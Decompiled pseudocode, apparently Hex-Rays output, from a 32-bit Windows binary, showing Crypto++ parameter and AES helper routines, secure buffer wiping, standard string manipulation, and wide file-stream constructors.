//----- (00418AC0) --------------------------------------------------------
int __thiscall sub_418AC0(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int result; // eax

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<int>::`vftable';
  result = *(_DWORD *)(this + 16);
  *(_DWORD *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4B93A0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int>::`vftable';

//----- (00418B70) --------------------------------------------------------
char __thiscall sub_418B70(unsigned int *this, void *a2, int a3, unsigned int *a4)
{
  unsigned int v5; // eax

  if ( __std_type_info_compare(&dword_4EE1D8, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&int `RTTI Type Descriptor', a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (00418BD0) --------------------------------------------------------
char __thiscall sub_418BD0(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  char result; // al

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<bool>::`vftable';
  result = *(_BYTE *)(this + 16);
  *(_BYTE *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BA254: using guessed type void *CryptoPP::AlgorithmParametersTemplate<bool>::`vftable';

//----- (00418C80) --------------------------------------------------------
char __thiscall sub_418C80(unsigned int *this, void *a2, int a3, _DWORD *a4)
{
  char result; // al

  if ( __std_type_info_compare(&dword_4ED868, &dword_4EE1D8) || (result = sub_43EE60(a3, a4, this + 4)) == 0 )
  {
    sub_4059C0(a2, (int)&bool `RTTI Type Descriptor', a3);
    result = *((_BYTE *)this + 16);
    *(_BYTE *)a4 = result;
  }
  return result;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4ED864: using guessed type bool bool `RTTI Type Descriptor';
// 4ED868: using guessed type int dword_4ED868;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (00418CE0) --------------------------------------------------------
void __thiscall sub_418CE0(int this)
{
  unsigned int v1; // edx
  void *v2; // esi

  v1 = *(_DWORD *)(this + 8);
  v2 = *(void **)(this + 12);
  if ( *(_DWORD *)(this + 4) < v1 )
    v1 = *(_DWORD *)(this + 4);
  memset(*(void **)(this + 12), 0, 4 * v1);
  if ( v1 )
    j_j_unknown_libname_61(v2);
  else
    j_j___free_base(v2);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00418D50) --------------------------------------------------------
_DWORD *__thiscall sub_418D50(_DWORD *this, _DWORD *a2)
{
  void *v3; // eax
  void *v4; // edx

  this[1] = a2[1];
  this[2] = a2[2];
  v3 = (void *)sub_41E7A0(a2[2], 0);
  this[3] = v3;
  v4 = (void *)a2[3];
  if ( v4 )
    sub_401670(v3, 4 * this[2], v4, 4 * a2[2]);
  return this;
}

//----- (00418DA0) --------------------------------------------------------
int __stdcall sub_418DA0(int a1)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  sub_41EF80((void **)a1, "AES", 3u);
  return a1;
}

//----- (00418E10) --------------------------------------------------------
int __stdcall sub_418E10(unsigned int a1)
{
  if ( a1 <= 0x10 )
    return 16;
  if ( a1 < 0x20 )
    return a1 - (((_BYTE)a1 - 1) & 7) + 7;
  return 32;
}

//----- (00418E50) --------------------------------------------------------
int sub_418E50()
{
  return 32;
}

//----- (00418E60) --------------------------------------------------------
void __thiscall sub_418E60(int this)
{
  unsigned int v1; // edx
  void *v2; // esi

  v1 = *(_DWORD *)(this + 8);
  v2 = *(void **)(this + 12);
  if ( *(_DWORD *)(this + 4) < v1 )
    v1 = *(_DWORD *)(this + 4);
  memset(*(void **)(this + 12), 0, v1);
  if ( v1 )
    j_j_unknown_libname_61(v2);
  else
    j_j___free_base(v2);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00418EE0) --------------------------------------------------------
void __thiscall sub_418EE0(_DWORD *this, size_t a2)
{
  unsigned int v3; // ecx
  void *v4; // edx

  v3 = this[2];
  v4 = (void *)this[3];
  if ( v3 != a2 )
  {
    memset(v4, 0, v3);
    j_j___free_base(v4);
    if ( a2 )
      v4 = sub_45AEA0(a2);
    else
      v4 = 0;
  }
  this[3] = v4;
  this[2] = a2;
  this[1] = -1;
}

//----- (00418F60) --------------------------------------------------------
int __thiscall sub_418F60(_DWORD *this, void *a2, size_t a3)
{
  unsigned int v4; // edx
  int result; // eax
  void *v6; // ecx
  void *v7; // ebx

  v4 = this[2];
  result = a3;
  v6 = a2;
  v7 = (void *)this[3];
  if ( v4 != a3 )
  {
    memset(v7, 0, v4);
    j_j___free_base(v7);
    result = a3;
    if ( a3 )
    {
      v7 = sub_45AEA0(a3);
      result = a3;
    }
    else
    {
      v7 = 0;
    }
    v6 = a2;
  }
  this[3] = v7;
  this[2] = result;
  this[1] = -1;
  if ( v7 && v6 )
    result = sub_401670(v7, result, v6, result);
  this[1] = -1;
  return result;
}

//----- (00419010) --------------------------------------------------------
void __thiscall sub_419010(_DWORD *this)
{
  void *v1; // edx
  unsigned int v2; // eax
  unsigned int v3; // ecx

  v1 = (void *)this[3];
  v2 = this[1];
  v3 = this[2];
  if ( v2 < v3 )
    v3 = v2;
  memset(v1, 0, v3);
  j_j___free_base(v1);
}

//----- (00419060) --------------------------------------------------------
_DWORD *__thiscall sub_419060(_DWORD *this, size_t a2)
{
  this[1] = -1;
  this[2] = a2;
  if ( a2 )
  {
    this[3] = sub_45AEA0(a2);
    return this;
  }
  else
  {
    this[3] = 0;
    return this;
  }
}

//----- (004190D0) --------------------------------------------------------
int __thiscall sub_4190D0(_DWORD *this)
{
  return this[3];
}

//----- (004190E0) --------------------------------------------------------
int __thiscall sub_4190E0(_DWORD *this, int a2)
{
  int result; // eax

  result = a2;
  this[3] = a2;
  return result;
}

//----- (004190F0) --------------------------------------------------------
void __noreturn sub_4190F0()
{
  char pExceptionObject[40]; // [esp+0h] [ebp-28h] BYREF

  sub_41E830(pExceptionObject);
  _CxxThrowException(
    pExceptionObject,
    (_ThrowInfo *)&_TI4_AUInputRejected___InputRejecting_VBufferedTransformation_CryptoPP___CryptoPP__);
}
// 4190F0: using guessed type void __noreturn sub_4190F0();

//----- (00419120) --------------------------------------------------------
void __thiscall sub_419120(_Mtx_t *this)
{
  int v1; // eax

  v1 = _Mtx_unlock(*this);
  if ( v1 )
    std::_Throw_C_error(v1);
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00419170) --------------------------------------------------------
void __thiscall sub_419170(void **this)
{
  if ( *this )
    j___free_base(*this);
  *this = 0;
}

//----- (004191C0) --------------------------------------------------------
int __thiscall sub_4191C0(char *this, const unsigned __int16 *a2, int a3)
{
  unsigned int v3; // edi
  unsigned int v4; // eax
  char *v6; // edx
  unsigned __int16 v7; // bx
  char *v8; // esi
  char *v9; // eax
  char *v10; // ecx
  int v11; // eax
  char *v12; // esi
  char *i; // [esp+4h] [ebp-8h]
  char *v14; // [esp+8h] [ebp-4h]

  v14 = this;
  v3 = wcslen(a2);
  v4 = *((_DWORD *)this + 4);
  if ( *((_DWORD *)this + 5) >= 8u )
  {
    this = *(char **)this;
    v14 = this;
  }
  if ( v3 > v4 )
    return -1;
  if ( !v3 )
    return 0;
  v6 = (char *)a2;
  v7 = *a2;
  v8 = this;
  v9 = &this[2 * (v4 - v3) + 2];
  for ( i = v9; ; v9 = i )
  {
    v10 = 0;
    v11 = (v9 - v8) >> 1;
    if ( v11 )
    {
      if ( *(_WORD *)v8 == v7 )
      {
LABEL_11:
        v10 = v8;
      }
      else
      {
        while ( v11 != 1 )
        {
          v8 += 2;
          --v11;
          if ( *(_WORD *)v8 == v7 )
            goto LABEL_11;
        }
      }
    }
    v12 = v10;
    if ( !v10 )
      break;
    if ( !sub_41FDB0(v10, v6, v3) )
      return (v12 - v14) >> 1;
    v6 = (char *)a2;
    v8 = v12 + 2;
  }
  return -1;
}

//----- (00419280) --------------------------------------------------------
void __thiscall sub_419280(void **this, unsigned int a2)
{
  unsigned int v3; // ebx
  unsigned int v4; // ecx
  _DWORD *v5; // esi
  int v6; // [esp+8h] [ebp-4h]

  v3 = (unsigned int)this[4];
  if ( v3 <= a2 )
  {
    v4 = (unsigned int)this[5];
    if ( v4 != a2 )
    {
      if ( v4 >= a2 )
      {
        if ( a2 < 8 && v4 >= 8 )
        {
          v5 = *this;
          memmove(this, *this, 2 * v3 + 2);
          if ( (unsigned int)(2 * (_DWORD)this[5] + 2) >= 0x1000 )
          {
            if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
              _invalid_parameter_noinfo_noreturn();
            v5 = (_DWORD *)*(v5 - 1);
          }
          sub_46C87D(v5);
          this[5] = (void *)7;
        }
      }
      else
      {
        LOBYTE(v6) = 0;
        sub_424000(this, a2 - v3, v6);
        this[4] = (void *)v3;
      }
    }
  }
}
// 4192A7: variable 'v6' is possibly undefined

//----- (00419320) --------------------------------------------------------
void **__thiscall sub_419320(void **this, __int16 a2)
{
  char *v2; // edx
  bool v3; // cf
  void **result; // eax
  int v5; // [esp+0h] [ebp-4h]

  v5 = (int)this;
  v2 = (char *)this[4];
  if ( v2 >= this[5] )
  {
    LOBYTE(v5) = 0;
    return sub_424140(this, (int)this, v5, a2);
  }
  else
  {
    v3 = (unsigned int)this[5] < 8;
    this[4] = v2 + 1;
    if ( !v3 )
      this = (void **)*this;
    *((_WORD *)this + (_DWORD)v2) = a2;
    result = 0;
    *((_WORD *)this + (_DWORD)v2 + 1) = 0;
  }
  return result;
}

//----- (00419370) --------------------------------------------------------
void **__thiscall sub_419370(int this, void *Src, unsigned int a3)
{
  unsigned int v4; // ecx
  int v5; // edx
  bool v6; // cf
  _WORD *v7; // edi
  int v9; // [esp-4h] [ebp-8h]
  int v10; // [esp+10h] [ebp+Ch]

  v4 = a3;
  v5 = *(_DWORD *)(this + 16);
  if ( a3 > *(_DWORD *)(this + 20) - v5 )
  {
    v9 = a3;
    LOBYTE(a3) = 0;
    return sub_4242A0((void **)this, v4, a3, Src, v9);
  }
  else
  {
    v6 = *(_DWORD *)(this + 20) < 8u;
    v10 = v5 + a3;
    v7 = (_WORD *)this;
    *(_DWORD *)(this + 16) = v5 + v4;
    if ( !v6 )
      v7 = *(_WORD **)this;
    memmove_0(&v7[v5], Src, 2 * v4);
    v7[v10] = 0;
    return (void **)this;
  }
}

//----- (004193E0) --------------------------------------------------------
int __thiscall sub_4193E0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  v2 = this[5];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)*this;
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  result = 0;
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (00419470) --------------------------------------------------------
int __thiscall sub_419470(int this, int a2)
{
  if ( this != a2 )
  {
    sub_41E940((_DWORD *)this);
    *(_OWORD *)this = *(_OWORD *)a2;
    *(_QWORD *)(this + 16) = *(_QWORD *)(a2 + 16);
    *(_DWORD *)(a2 + 16) = 0;
    *(_DWORD *)(a2 + 20) = 7;
    *(_WORD *)a2 = 0;
  }
  return this;
}

//----- (004194E0) --------------------------------------------------------
int __thiscall sub_4194E0(int this, void *a2)
{
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 7;
  *(_WORD *)this = 0;
  sub_41EB20((void **)this, a2, wcslen((const unsigned __int16 *)a2));
  return this;
}

//----- (00419530) --------------------------------------------------------
_DWORD *__thiscall sub_419530(_DWORD *this, _DWORD *Src)
{
  _OWORD *v3; // edi
  unsigned int v4; // eax
  _DWORD *result; // eax
  int v6; // ebx
  unsigned int v7; // ecx
  size_t v8; // eax
  void *v9; // eax
  _DWORD *v10; // ecx
  unsigned int v11; // [esp+Ch] [ebp-4h]

  v3 = Src;
  this[4] = 0;
  this[5] = 0;
  v4 = Src[4];
  v11 = v4;
  if ( Src[5] >= 8u )
    v3 = (_OWORD *)*Src;
  if ( v4 < 8 )
  {
    *(_OWORD *)this = *v3;
    this[4] = v4;
    result = this;
    this[5] = 7;
    return result;
  }
  v6 = v4 | 7;
  if ( (v4 | 7) > 0x7FFFFFFE )
    v6 = 2147483646;
  v7 = 2 * (v6 + 1);
  if ( (unsigned int)(v6 + 1) > 0x7FFFFFFF )
  {
    v7 = -1;
LABEL_10:
    v8 = v7 + 35;
    if ( v7 + 35 <= v7 )
      v8 = -1;
    v9 = operator new(v8);
    if ( !v9 )
      _invalid_parameter_noinfo_noreturn();
    v10 = (_DWORD *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);
    *(v10 - 1) = v9;
    goto LABEL_17;
  }
  if ( v7 >= 0x1000 )
    goto LABEL_10;
  if ( v7 )
    v10 = operator new(2 * (v6 + 1));
  else
    v10 = 0;
LABEL_17:
  *this = v10;
  memmove(v10, v3, 2 * v11 + 2);
  this[4] = v11;
  result = this;
  this[5] = v6;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00419610) --------------------------------------------------------
int __thiscall sub_419610(_DWORD *this, int a2, unsigned int a3, size_t a4)
{
  size_t v4; // edx
  unsigned int v5; // eax
  size_t v6; // eax

  v4 = a4;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  v5 = this[4];
  if ( v5 < a3 )
    sub_421040();
  v6 = v5 - a3;
  if ( v6 < a4 )
    v4 = v6;
  if ( this[5] >= 0x10u )
    this = (_DWORD *)*this;
  sub_41EF80((void **)a2, (char *)this + a3, v4);
  return a2;
}
// 421040: using guessed type void __noreturn sub_421040(void);

//----- (004196B0) --------------------------------------------------------
void __thiscall sub_4196B0(void **Src, unsigned int a2)
{
  unsigned int v3; // edi
  unsigned int v4; // edx
  unsigned int v5; // edi
  unsigned int v6; // ecx
  unsigned int v7; // ecx
  size_t v8; // eax
  void *v9; // eax
  _DWORD *v10; // ebx
  _DWORD *v11; // eax
  void *v12; // edi
  size_t v13; // [esp-4h] [ebp-18h]
  void *v14; // [esp+Ch] [ebp-8h]
  unsigned int v15; // [esp+10h] [ebp-4h]

  v3 = (unsigned int)Src[4];
  v14 = (void *)v3;
  if ( v3 <= a2 )
  {
    v4 = (unsigned int)Src[5];
    v15 = v4;
    if ( v4 != a2 )
    {
      if ( v4 >= a2 )
      {
        if ( a2 < 0x10 && v4 >= 0x10 )
          sub_41ECD0(Src);
      }
      else
      {
        if ( 0x7FFFFFFF - v3 < a2 - v3 )
          sub_4257D0();
        v5 = a2 | 0xF;
        if ( (a2 | 0xF) <= 0x7FFFFFFF )
        {
          v6 = v4 >> 1;
          if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
          {
            if ( v5 < v6 + v4 )
              v5 = v6 + v4;
          }
          else
          {
            v5 = 0x7FFFFFFF;
          }
        }
        else
        {
          v5 = 0x7FFFFFFF;
        }
        v7 = __CFADD__(v5, 1) ? -1 : v5 + 1;
        if ( v7 < 0x1000 )
        {
          if ( v7 )
          {
            v11 = operator new(__CFADD__(v5, 1) ? -1 : v5 + 1);
            v4 = v15;
            v10 = v11;
          }
          else
          {
            v10 = 0;
          }
        }
        else
        {
          v8 = v7 + 35;
          if ( v7 + 35 <= v7 )
            v8 = -1;
          v9 = operator new(v8);
          if ( !v9 )
            goto LABEL_30;
          v4 = v15;
          v10 = (_DWORD *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);
          *(v10 - 1) = v9;
        }
        Src[4] = (void *)a2;
        Src[5] = (void *)v5;
        v13 = (size_t)v14 + 1;
        if ( v4 >= 0x10 )
        {
          v12 = *Src;
          memmove(v10, *Src, v13);
          if ( v15 + 1 < 0x1000 )
          {
LABEL_23:
            sub_46C87D(v12);
            *Src = v10;
            Src[4] = v14;
            return;
          }
          if ( (unsigned int)v12 - *((_DWORD *)v12 - 1) - 4 <= 0x1F )
          {
            v12 = (void *)*((_DWORD *)v12 - 1);
            goto LABEL_23;
          }
LABEL_30:
          _invalid_parameter_noinfo_noreturn();
        }
        memmove(v10, Src, v13);
        *Src = v10;
        Src[4] = v14;
      }
    }
  }
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00419820) --------------------------------------------------------
void **__thiscall sub_419820(char *this, unsigned int a2, char a3)
{
  unsigned int v3; // edx
  void **result; // eax
  unsigned int v5; // ebx
  unsigned int *v6; // esi
  char *v7; // esi

  v3 = a2;
  result = (void **)*((_DWORD *)this + 5);
  v5 = *((_DWORD *)this + 4);
  v6 = (unsigned int *)(this + 16);
  if ( a2 > v5 )
  {
    if ( a2 - v5 > (unsigned int)result - v5 )
    {
      LOBYTE(a2) = 0;
      return sub_424E00((void **)this, v3 - v5, a2, v3 - v5, a3);
    }
    else
    {
      *v6 = a2;
      if ( (unsigned int)result >= 0x10 )
        this = *(char **)this;
      v7 = &this[v5];
      result = (void **)memset(&this[v5], a3, a2 - v5);
      v7[a2 - v5] = 0;
    }
  }
  else
  {
    if ( (unsigned int)result >= 0x10 )
      this = *(char **)this;
    *v6 = a2;
    this[a2] = 0;
  }
  return result;
}

//----- (004198A0) --------------------------------------------------------
void **__thiscall sub_4198A0(char *this, const char *Src)
{
  unsigned int v4; // esi
  int v5; // ecx
  bool v6; // cf
  char *v7; // ebx
  int Srca; // [esp+10h] [ebp+8h]

  v4 = strlen(Src);
  v5 = *((_DWORD *)this + 4);
  Srca = *((_DWORD *)this + 4);
  if ( v4 > *((_DWORD *)this + 5) - v5 )
  {
    LOBYTE(Srca) = 0;
    return sub_424F60((void **)this, v4, Srca, Src, v4);
  }
  else
  {
    v6 = *((_DWORD *)this + 5) < 0x10u;
    *((_DWORD *)this + 4) = v4 + v5;
    v7 = this;
    if ( !v6 )
      v7 = *(char **)this;
    memmove_0(&v7[v5], Src, v4);
    v7[v4 + Srca] = 0;
    return (void **)this;
  }
}

//----- (00419910) --------------------------------------------------------
void **__thiscall sub_419910(char *this, _DWORD *Src)
{
  _DWORD *v3; // ecx
  unsigned int v4; // edi
  unsigned int v5; // edx
  int v6; // ebx
  char *v7; // eax
  void **result; // eax
  size_t v9; // [esp-4h] [ebp-10h]
  _BYTE *Srca; // [esp+14h] [ebp+8h]

  v3 = Src;
  v4 = Src[4];
  if ( Src[5] >= 0x10u )
    v3 = (_DWORD *)*Src;
  v5 = *((_DWORD *)this + 5);
  v6 = *((_DWORD *)this + 4);
  if ( v4 > v5 - v6 )
  {
    v9 = Src[4];
    LOBYTE(Src) = 0;
    return sub_424F60((void **)this, v4, (int)Src, v3, v9);
  }
  else
  {
    Srca = this;
    *((_DWORD *)this + 4) = v4 + v6;
    v7 = this;
    if ( v5 >= 0x10 )
    {
      v7 = *(char **)this;
      Srca = *(_BYTE **)this;
    }
    memmove_0(&v7[v6], v3, v4);
    result = (void **)this;
    Srca[v4 + v6] = 0;
  }
  return result;
}

//----- (00419990) --------------------------------------------------------
int __thiscall sub_419990(int this, char a2)
{
  unsigned int v3; // edx
  unsigned int v4; // ecx
  _BYTE *v5; // eax
  int v7; // [esp+4h] [ebp-4h]

  v3 = *(_DWORD *)(this + 16);
  v4 = *(_DWORD *)(this + 20);
  if ( v3 >= v4 )
  {
    LOBYTE(v7) = 0;
    sub_424B40((void **)this, v4, v7, a2);
    return this;
  }
  else
  {
    *(_DWORD *)(this + 16) = v3 + 1;
    v5 = (_BYTE *)this;
    if ( v4 >= 0x10 )
      v5 = *(_BYTE **)this;
    v5[v3] = a2;
    v5[v3 + 1] = 0;
    return this;
  }
}
// 4199D1: variable 'v7' is possibly undefined

//----- (004199E0) --------------------------------------------------------
void __thiscall sub_4199E0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  v2 = this[5];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)*this;
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[4] = 0;
  this[5] = 15;
  *(_BYTE *)this = 0;
}

//----- (00419A60) --------------------------------------------------------
_DWORD *__thiscall sub_419A60(_DWORD *this, _QWORD *a2)
{
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  if ( this != (_DWORD *)a2 )
  {
    v3 = this[5];
    if ( v3 >= 0x10 )
    {
      v4 = (_DWORD *)*this;
      if ( v3 + 1 >= 0x1000 )
      {
        if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v4 = (_DWORD *)*(v4 - 1);
      }
      sub_46C87D(v4);
    }
    this[4] = 0;
    this[5] = 15;
    *(_BYTE *)this = 0;
    *(_OWORD *)this = *(_OWORD *)a2;
    *((_QWORD *)this + 2) = a2[2];
    *((_DWORD *)a2 + 4) = 0;
    *((_DWORD *)a2 + 5) = 15;
    *(_BYTE *)a2 = 0;
  }
  return this;
}

//----- (00419B10) --------------------------------------------------------
_DWORD *__thiscall sub_419B10(_DWORD *this, int a2)
{
  this[4] = 0;
  this[5] = 0;
  *(_OWORD *)this = *(_OWORD *)a2;
  *((_QWORD *)this + 2) = *(_QWORD *)(a2 + 16);
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  return this;
}

//----- (00419B50) --------------------------------------------------------
int __thiscall sub_419B50(int this, size_t a2, char a3)
{
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 15;
  *(_BYTE *)this = 0;
  sub_41EE40((void **)this, a2, a3);
  return this;
}

//----- (00419B80) --------------------------------------------------------
int __thiscall sub_419B80(int this, void *a2)
{
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 15;
  *(_BYTE *)this = 0;
  sub_41EF80((void **)this, a2, strlen((const char *)a2));
  return this;
}

//----- (00419BC0) --------------------------------------------------------
_DWORD *__thiscall sub_419BC0(_DWORD *this)
{
  _DWORD *result; // eax

  this[4] = 0;
  result = this;
  this[5] = 15;
  *(_BYTE *)this = 0;
  return result;
}

//----- (00419BE0) --------------------------------------------------------
_DWORD *__thiscall sub_419BE0(_DWORD *this, _DWORD *Src)
{
  _OWORD *v2; // ebx
  unsigned int v4; // ecx
  _DWORD *result; // eax
  int v6; // edi
  size_t v7; // eax
  void *v8; // eax
  _DWORD *v9; // ecx
  unsigned int v10; // [esp+Ch] [ebp-4h]

  v2 = Src;
  this[4] = 0;
  this[5] = 0;
  v4 = Src[4];
  v10 = v4;
  if ( Src[5] >= 0x10u )
    v2 = (_OWORD *)*Src;
  if ( v4 >= 0x10 )
  {
    v6 = v4 | 0xF;
    if ( (v4 | 0xF) > 0x7FFFFFFF )
      v6 = 0x7FFFFFFF;
    if ( (unsigned int)(v6 + 1) < 0x1000 )
    {
      if ( v6 == -1 )
        v9 = 0;
      else
        v9 = operator new(v6 + 1);
    }
    else
    {
      v7 = v6 + 36;
      if ( v6 + 36 <= (unsigned int)(v6 + 1) )
        v7 = -1;
      v8 = operator new(v7);
      if ( !v8 )
        _invalid_parameter_noinfo_noreturn();
      v9 = (_DWORD *)(((unsigned int)v8 + 35) & 0xFFFFFFE0);
      *(v9 - 1) = v8;
    }
    *this = v9;
    memmove(v9, v2, v10 + 1);
    this[4] = v10;
    result = this;
    this[5] = v6;
  }
  else
  {
    result = this;
    *(_OWORD *)this = *v2;
    this[4] = v4;
    this[5] = 15;
  }
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00419CB0) --------------------------------------------------------
_DWORD *__thiscall sub_419CB0(_DWORD *this, wchar_t *a2, int a3, int a4, int a5)
{
  _DWORD *v6; // esi
  _DWORD *v7; // edi
  int v8; // eax
  int v9; // ecx

  v6 = this + 4;
  *this = &unk_4CF904;
  this[4] = &unk_4CF3F0;
  this[30] = &std::ios_base::`vftable';
  this[30] = &std::wios::`vftable';
  v7 = this + 6;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::wistream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 24;
  v8 = *this;
  this[2] = 0;
  this[3] = 0;
  sub_4211D0((int)this + *(_DWORD *)(v8 + 4), (int)(this + 6), 0);
  *(_DWORD *)((char *)v6 + *(_DWORD *)(*v6 + 4)) = &std::wostream::`vftable';
  *(_DWORD *)((char *)v6 + *(_DWORD *)(*v6 + 4) - 4) = *(_DWORD *)(*v6 + 4) - 8;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::wiostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 32;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::wfstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 120;
  sub_41F4D0(v7, 0);
  if ( !sub_41F3D0(v7, a2, 35, v9) )
    sub_4036A0(
      (_DWORD *)((char *)this + *(_DWORD *)(*this + 4)),
      *((_BYTE *)this + *(_DWORD *)(*this + 4) + 12) | (4
                                                      * (*(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) + 56) == 0)
                                                      + 2),
      0);
  return this;
}
// 419DC7: variable 'v9' is possibly undefined
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';
// 4BD604: using guessed type void *std::wostream::`vftable';
// 4CF880: using guessed type void *std::wistream::`vftable';
// 4CF900: using guessed type void *std::wiostream::`vftable';
// 4CF974: using guessed type void *std::wfstream::`vftable';

//----- (00419E10) --------------------------------------------------------
int __thiscall sub_419E10(_BYTE *this)
{
  int result; // eax

  result = sub_41F310((int)(this + 4));
  if ( !result )
    return sub_4036A0(
             &this[*(_DWORD *)(*(_DWORD *)this + 4)],
             this[*(_DWORD *)(*(_DWORD *)this + 4) + 12] | (4
                                                          * (*(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56] == 0)
                                                          + 2),
             0);
  return result;
}

//----- (00419E50) --------------------------------------------------------
_DWORD *__thiscall sub_419E50(_DWORD *this, int a2, int a3, int a4, int a5)
{
  wchar_t *v6; // eax
  int v8; // [esp-8h] [ebp-20h]
  int v9; // [esp-4h] [ebp-1Ch]

  v6 = (wchar_t *)a2;
  if ( *(_DWORD *)(a2 + 20) >= 8u )
    v6 = *(wchar_t **)a2;
  sub_419ED0(this, v6, a3, v8, v9);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::wofstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 104;
  return this;
}
// 419E8B: variable 'v8' is possibly undefined
// 419E8B: variable 'v9' is possibly undefined
// 4CF7AC: using guessed type void *std::wofstream::`vftable';

//----- (00419ED0) --------------------------------------------------------
_DWORD *__thiscall sub_419ED0(_DWORD *this, wchar_t *a2, int a3, int a4, int a5)
{
  _DWORD *v6; // esi
  int v7; // ecx

  *this = &unk_4CF3F0;
  this[26] = &std::ios_base::`vftable';
  this[26] = &std::wios::`vftable';
  v6 = this + 1;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::wostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  sub_4211D0((int)this + *(_DWORD *)(*this + 4), (int)(this + 1), 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::wofstream::`vftable';
